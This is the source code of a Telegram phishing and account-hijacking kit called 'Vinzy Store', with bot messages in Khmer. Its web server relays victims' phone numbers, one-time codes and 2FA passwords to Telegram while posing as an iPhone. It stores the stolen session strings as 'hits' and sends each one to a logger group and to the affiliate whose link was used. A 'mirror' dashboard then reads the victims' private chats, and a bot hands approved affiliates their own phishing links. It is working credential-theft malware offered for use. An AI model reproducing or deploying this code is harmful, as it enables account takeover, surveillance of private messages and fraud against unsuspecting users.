import os
import asyncio
import telebot
import psycopg2
import logging
import json
from telebot import types
from quart import Quart, request, jsonify, render_template_string
from telethon import TelegramClient, functions, errors, events
from telethon.sessions import StringSession
from threading import Thread
from datetime import datetime

# --- 1. CONFIGURATION & LOGGING ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", 0)) 
VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", 0))
ADMIN_HANDLE = "@g_yuyuu"
BASE_URL = os.environ.get("BASE_URL", "").rstrip('/')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("VinzyUltra")

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
app = Quart(__name__)

# Memory storage for temporary sessions and login states
active_mirrors = {} 
pending_auths = {}

# --- 2. DATABASE ENGINE (Full Schema) ---

def get_db_connection():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    """Ensures all tables for users, accounts, and hits are active."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        # Table for Vinzy Store Authorized Users
        cur.execute("""
            CREATE TABLE IF NOT EXISTS approved_users (
                user_id BIGINT PRIMARY KEY, 
                username TEXT,
                status TEXT DEFAULT 'approved',
                joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Table for Harvested Telegram Sessions
        cur.execute("""
            CREATE TABLE IF NOT EXISTS controlled_accounts (
                phone TEXT PRIMARY KEY, 
                session_string TEXT NOT NULL, 
                owner_name TEXT, 
                tid BIGINT,
                hit_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                api_id INTEGER,
                api_hash TEXT
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        logger.info("Database Core: Initialized and Connected.")
    except Exception as e:
        logger.error(f"Database Error: {e}")

def is_approved(user_id):
    """Firewall check for bot commands."""
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT status FROM approved_users WHERE user_id = %s", (user_id,))
        res = cur.fetchone()
        cur.close()
        conn.close()
        return res is not None
    except: return False

init_db()

# --- 3. SECTION: THE LOGIN HTML BACKEND (HIT & TID LOGIC) ---

@app.route('/')
async def login_page():
    """Serves the login interface. Automatically detects TID from the URL."""
    try:
        with open("templates/login.html", "r", encoding="utf-8") as f:
            return f.read()
    except:
        return "<h1>Error: login.html missing in templates/</h1>", 404

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    """The Bridge: Receives phone and TID from the HTML form."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "").strip()
    tid = data.get('tid') # This is the ID of the person who sent the link

    # Spoofing as a high-trust mobile device
    client = TelegramClient(StringSession(), API_ID, API_HASH, 
                            device_model="iPhone 16 Pro Max", 
                            system_version="18.3")
    await client.connect()
    
    try:
        # Requesting the OTP from Telegram
        sent_code = await client.send_code_request(phone)
        active_mirrors[phone] = {
            "client": client, 
            "hash": sent_code.phone_code_hash, 
            "tid": tid,
            "step": "otp_pending"
        }
        return jsonify({"status": "success", "msg": "OTP Sent"})
    except errors.FloodWaitError as e:
        return jsonify({"status": "error", "msg": f"Flood error. Wait {e.seconds}s"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    """The Closer: Verifies code/2FA and saves the session to the DB."""
    data = await request.json
    phone = data.get('phone', '').replace("+", "")
    code = data.get('code')
    password = data.get('password') # Only used if 2FA is active
    tid = data.get('tid')

    if phone not in active_mirrors:
        return jsonify({"status": "error", "msg": "Session Expired. Please restart."})

    mirror_data = active_mirrors[phone]
    client = mirror_data['client']

    try:
        # Check if we need to sign in with password (2FA)
        if password:
            await client.sign_in(password=password)
        else:
            await client.sign_in(phone, code, phone_code_hash=mirror_data['hash'])
        
        # Capture User Info
        me = await client.get_me()
        session_string = client.session.save()
        
        # Log to Database
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO controlled_accounts (phone, session_string, owner_name, tid) 
            VALUES (%s, %s, %s, %s) 
            ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
        """, (phone, session_string, me.first_name, tid))
        conn.commit()
        cur.close()
        conn.close()

        # Notify the Admin Logger Group
        bot.send_message(LOGGER_GROUP, 
            f"💰 <b>HIT ថ្មី (Vinzy Store)</b>\n\n"
            f"👤 Target: {me.first_name}\n"
            f"📱 Number: <code>{phone}</code>\n"
            f"🔑 Session: <code>{session_string}</code>\n"
            f"🔗 Generated by ID: <code>{tid}</code>")

        # Notify the specific user who generated the link
        if tid:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🖥 Open Mirror Dashboard", url=f"{BASE_URL}/mirror/{phone}"))
            bot.send_message(tid, 
                f"🎯 <b>អ្នកទទួលបាន HIT ថ្មីមួយ!</b>\n\n"
                f"👤 Name: {me.first_name}\n"
                f"📱 Phone: {phone}\n\n"
                f"ចុចប៊ូតុងខាងក្រោមដើម្បីចូលមើល Mirror View។", reply_markup=markup)

        await client.disconnect()
        del active_mirrors[phone]
        return jsonify({"status": "success"})

    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

# --- 4. SECTION: THE MIRROR HTML LOGIC (THE "CROSS BRIDGE") ---

@app.route('/mirror/<phone>')
async def mirror_interface(phone):
    """The Cross-Bridge: Logs in using the saved session and displays chats."""
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("SELECT session_string, owner_name FROM controlled_accounts WHERE phone = %s", (phone,))
    res = cur.fetchone()
    cur.close()
    conn.close()

    if not res: return "<h1>Account not found in system.</h1>", 404

    # Connect using the captured session string
    client = TelegramClient(StringSession(res[0]), API_ID, API_HASH, 
                            device_model="Telegram Web Pro", 
                            system_version="Windows 11")
    await client.connect()
    
    if not await client.is_user_authorized():
        return "<h1>Session Revoked: The user logged out.</h1>", 401

    # Fetch Real-time Conversations
    dialogs = await client.get_dialogs(limit=35)
    chats_html = ""
    for d in dialogs:
        last_msg = (d.message.message[:40] + "...") if d.message and d.message.message else "<i>[Media or Action]</i>"
        chats_html += f"""
        <div style="padding:12px; border-bottom:1px solid #222; cursor:pointer;" onclick="loadChat('{d.id}')">
            <div style="font-weight:bold; color:#8774e1;">{d.name}</div>
            <div style="font-size:12px; color:#999;">{last_msg}</div>
        </div>
        """
    
    await client.disconnect()

    # Load the Mirror Dashboard HTML
    try:
        with open("templates/mirror.html", "r", encoding="utf-8") as f:
            template = f.read()
            return template.replace("{{ chats }}", chats_html).replace("{{ phone }}", phone).replace("{{ name }}", res[1])
    except:
        return f"<h1>Mirror View: {res[1]}</h1><div style='display:flex;'>{chats_html}</div>"

# --- 5. SECTION: BOT COMMANDS (ADMIN & APPROVALS) ---

@bot.message_handler(commands=['start'])
def cmd_start(m):
    user_id = m.from_user.id
    if is_approved(user_id):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton("🔗 បង្កើតតំណភ្ជាប់"), types.KeyboardButton("📋 បញ្ជីគណនី"))
        markup.add(types.KeyboardButton("❓ ជំនួយ"))
        bot.send_message(m.chat.id, "🎯 <b>Ultra Vinzy Mode: សកម្ម</b>\n\nសូមជ្រើសរើសមុខងារខាងក្រោម។", reply_markup=markup)
    else:
        bot.send_message(m.chat.id, f"🚫 <b>ចូលប្រើមិនបានទេ!</b>\n\nគណនីរបស់អ្នកមិនទាន់ត្រូវបានអនុញ្ញាតឡើយ។\nសូមទាក់ទង: {ADMIN_HANDLE}")
        
        # Send Approval Request to Admin Group
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ យល់ព្រម (Approve)", callback_data=f"user_ok_{user_id}"))
        bot.send_message(VERIFY_GROUP, 
            f"🔔 <b>សំណើសុំចូលប្រើថ្មី</b>\n\n"
            f"👤 User: @{m.from_user.username}\n"
            f"🆔 ID: <code>{user_id}</code>", 
            reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('user_ok_'))
def handle_approval_click(call):
    if call.message.chat.id != VERIFY_GROUP: return
    uid = int(call.data.split('_')[2])
    
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (uid,))
    conn.commit()
    cur.close()
    conn.close()
    
    bot.edit_message_text(f"✅ <b>Approved!</b>\nUser ID <code>{uid}</code> អាចប្រើប្រាស់បានហើយ។", call.message.chat.id, call.message.message_id)
    bot.send_message(uid, "🎉 <b>អបអរសាទរ!</b>\nគណនីរបស់អ្នកត្រូវបាន Admin យល់ព្រមឱ្យប្រើប្រាស់ហើយ។ ចុច /start ដើម្បីចាប់ផ្តើម។")

@bot.message_handler(func=lambda m: m.text == "🔗 បង្កើតតំណភ្ជាប់")
def cmd_link_generator(m):
    if not is_approved(m.from_user.id): return
    # The TID is appended to the URL so the server knows who gets the notification
    user_link = f"{BASE_URL}/?id={m.from_user.id}"
    bot.reply_to(m, f"🌐 <b>តំណភ្ជាប់របស់អ្នកគឺ៖</b>\n\n<code>{user_link}</code>\n\n<i>រាល់ពេលមានអ្នកចូល Login តាមតំណនេះ ប៊តនឹងជូនដំណឹងមកអ្នកផ្ទាល់។</i>")

@bot.message_handler(func=lambda m: m.text.startswith('.mirror '))
def cmd_mirror_bridge(m):
    if not is_approved(m.from_user.id): return
    parts = m.text.split('.mirror ')
    if len(parts) < 2: return
    phone = parts[1].strip().replace("+", "").replace(" ", "")
    
    bot.reply_to(m, f"🖥 <b>Mirror View Link:</b>\n{BASE_URL}/mirror/{phone}")

# --- 6. SECTION: RUNTIME & THREADING ---

def run_telegram_bot():
    """Runs the Telebot polling in a safe loop."""
    logger.info("Bot Polling Started...")
    bot.infinity_polling(skip_pending=True)

if __name__ == "__main__":
    # 1. Start the Telegram Bot in a background thread
    bot_thread = Thread(target=run_telegram_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # 2. Start the Quart Web Server
    # Port 8000 is default for many cloud platforms
    port = int(os.environ.get("PORT", 8000))
    logger.info(f"Web Server active on port {port}")
    app.run(host="0.0.0.0", port=port)
